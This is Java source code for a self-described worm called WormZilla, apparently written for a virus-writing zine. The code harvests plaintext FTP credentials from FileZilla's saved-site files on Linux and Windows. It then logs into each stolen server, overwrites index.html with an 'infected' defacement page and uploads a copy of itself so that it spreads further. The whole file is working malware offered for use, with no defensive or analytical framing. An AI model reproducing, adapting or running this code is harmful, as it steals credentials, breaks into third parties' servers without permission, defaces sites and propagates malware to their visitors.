/**
 * Wormzilla is a worm, searching for filezilla logs on Linux and Windows (XP, Vista, 7) systems and spreading via FTP
 * 
 * @author R3s1stanc3 
 * @version 1.0
 */

import java . io . * ;
import java . util . ArrayList ;
import java . util . Random ;
import org . jibble . simpleftp . * ;

public class WormZilla {

    // Because pushing NULL in the arrays didn't work for some reason
    String nullString = String . valueOf ( new Random ( ) . nextInt ( ) ) ;
    String html = "<html><title>Infected by WormZilla</title><center>Sorry bro.<br>You got infected by <a href=\"./WormZilla.jar\">WormZilla</a><br>I'm spreading all over the internet<br>Written by R3s1stanc3 [vxnetw0rk] for DarK-CodeZ #5<br><a href=\"mailto:r3s1stanc3@riseup.net\">r3s1stanc3@riseup.net</a> | <a href=\"http://r3s1stanc3.virii.lu\">r3s1stanc3.virii.lu</a></center></html>" ;
    
    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        new WormZilla ( ) ;
    }
    
    public WormZilla ( )
    {
        
        String os = getOS ( ) ;
        if ( os . equals ( null ) ) System . exit ( 0 ) ;
        String homedir = System . getProperty ( "user.home" ) ;
        
        // genertating the FileZilla directory
        String fzDir ;
        // Linux: /home/username/.filezilla
        if ( os . equals ( "LINUX" ) ) fzDir = homedir + "/.filezilla/" ;
        else if ( os . equals ( "WinXP" ) ) fzDir = homedir + "\\Application Data\\FileZilla\\" ;
        else if ( os . equals ( "WinVis7" ) ) fzDir = homedir + "\\AppData\\Roaming\\FileZilla\\" ;
        else
        {
            fzDir = null ; 
            System . exit ( 0 ) ;
        }
        //System . out . println ( fzDir ) ; // for debugging
        
        // sitemanager.xml and recentservers.xml store passwords in plaintext. Have a look at them :)
        String sitemanager = readFile ( fzDir + "sitemanager.xml" ) ;
        sitemanager += readFile ( fzDir + "recentservers.xml" ) ;
        
        String [ ] servers = sitemanager . split ( "<Server>" ) ;
        
        //System . out . println ( servers . length + " servers found!" ) ; // debugging
        
        // generating an ArrayList with Object Arrays as Objects. Every Object Array will carry the information of a FTP server
        // Object [0] == Server IP, if there's an error while reading -> set to nullString
        // Object [1] == Port, if there's an error while reading -> set to 0
        // Object [2] == Username, if there's an error while reading -> set to nullString
        // Object [3] == Password, if there's an error while reading -> set to nullString
        ArrayList<Object [ ]> serverData = new ArrayList<Object [ ]> ( ) ;
        
        for ( int i = 1; i < servers . length; i ++ )
        {
            serverData . add ( i-1, (Object[])getServData ( servers [ i ] )) ;
        }
        
        // writing our HTML code to a file and upload it later
        writeFile ( nullString + ".html", html ) ;
        
        for ( int i = 0; i < serverData . size( ) ; i ++ )
        {
            
            // checking if there was any error while reading the server data
            if ( ((serverData . get ( i )) [ 0 ] . equals ( nullString )) || ((serverData . get ( i )) [ 1 ] . equals ( 0 )) ||
                ((serverData . get ( i )) [ 2 ] . equals ( nullString )) || ((serverData . get ( i )) [ 3 ] . equals ( nullString )) )
            {
                continue ;
            }
            else
            {
                
                try
                {
                    SimpleFTP ftp = new SimpleFTP ( ) ;
                    // connect to the FTP server
                    ftp . connect ( (String)serverData . get ( i ) [ 0 ], (Integer)serverData . get ( i ) [ 1 ], (String)serverData . get ( i ) [ 2 ], (String)serverData . get ( i ) [ 3 ] ) ;
                    ftp . bin ( ) ;
                    // upload our HTML file and rename it to index.html on the server
                    ftpUpload ( ftp, nullString + ".html", "index.html" ) ;
                    // upload our worm and rename it to WormZilla.jar on the server
                    ftpUpload ( ftp, getName ( ), "WormZilla.jar" ) ;
                    ftp . disconnect ( ) ;
                }
                catch ( Exception e ) { continue ; }
            
            }
            
        }
        
        deleteFile ( nullString + ".html" ) ;
        
    }
    
    /**
     * Reads the content of a file
     * @param name Name of the file
     * @return The files content as String
     */
    public String readFile ( String name )
    {
        
        try
        {
            RandomAccessFile file = new RandomAccessFile ( name, "r" ) ;
            byte [ ] data = new byte [ ( int ) file . length ( ) ] ;
            
            file . read ( data ) ;
            
            file . close ( ) ;
            
            return new String ( data ) ;
        }
        catch ( Exception e ) { return null ; }
        
    }
    
    /**
     * Gives the current OS
     * @return Windows/Linux
     */
    public String getOS ( )
    {
        
        String os = System . getProperty ( "os.name" ) ;
        if ( (os . indexOf ( "nix" ) != -1) || (os . indexOf ( "nux" ) != -1) ) return "LINUX" ;
        else if ( os . indexOf ( "Win" ) != -1 ) 
        {
            if ( os . indexOf ( "Windows XP" ) != -1 ) return "WinXP" ;
            else return "WinVis7" ;
        }
        else return null ;
        
    }
    
    /**
     * Splits the host, user, port and past out of a <Server></Server> part of a FileZilla log file
     * Have a look at the files, to understand it.
     * @param server Part of the log file to split
     * @return Object array containing host(1), port(2), user(3) and pass(4) 
     */
    public Object [ ] getServData ( String server )
    {
        
        String host ;
        try
        {
            host = (server . split ( "<Host>" )) [ 1 ] . split ( "</Host>" ) [ 0 ] ;
        }
        catch ( Exception e ) { host = nullString ; }
        int port ;
        try
        {
            port = Integer . parseInt ( (server . split ( "<Port>" )) [ 1 ] . split ( "</Port>" ) [ 0 ] ) ;
        }
        catch ( Exception e ) { port = 0 ; }
        String user ;
        try
        {
            user = ((server . split ( "<User>" )) [ 1 ] . split ( "</User>" )) [ 0 ] ;
        }
        catch ( Exception e ) { user = nullString ; }
        String pass ;
        try
        {
            pass = ((server . split ( "<Pass>" )) [ 1 ] . split ( "</Pass>" )) [ 0 ] ;
        }
        catch ( Exception e ) { pass = nullString ; }
        
        Object [ ] servData = { host, port, user, pass } ;
        
        return servData ;
        
    }
    
    /**
     * Uploads a file to a FTP server
     * @param ftp SimpleFTP object to upload to
     * @param fileL Local file path
     * @param fileR Remote file path
     */
    public void ftpUpload ( SimpleFTP ftp, String fileL, String fileR )
    {
        
        try
        {
            // upload files
            ftp . stor ( new FileInputStream ( new File ( fileL ) ), fileR ) ;
            
        }
        catch ( Exception e ) { }
        
    }
    
    /**
     * Function to get the file name of the running file
     * @return Filename as String
     */
    public static String getName ( )
    {
        
        String path = System.getProperty("java.class.path") ;
        String [ ] pathA ;
        if ( System.getProperty("os.name") . indexOf ( "Win" ) != -1 ) pathA = path . split ( "\\" ) ;
        else pathA = path . split ( "//" ) ;
        return pathA [ pathA . length - 1 ] ;
        
    }
    
    /**
     * Writes a String to a file
     * @param fi File to write to
     * @param data String to write in the file
     */
    public void writeFile ( String fi, String data )
    {
        
        try
        {
            File file = new File ( fi ) ;
            FileWriter fw = new FileWriter ( file ) ;
            fw . write ( data ) ;
            fw . flush ( ) ;
            fw . close ( ) ;
        }
        catch ( Exception e ) { }
        
    }
    
    /**
     * Deletes a file
     * @param file File to delete
     */
    public void deleteFile ( String file )
    {
        
        ( new File ( file ) ) . delete ( ) ;
        
    } 
    
}
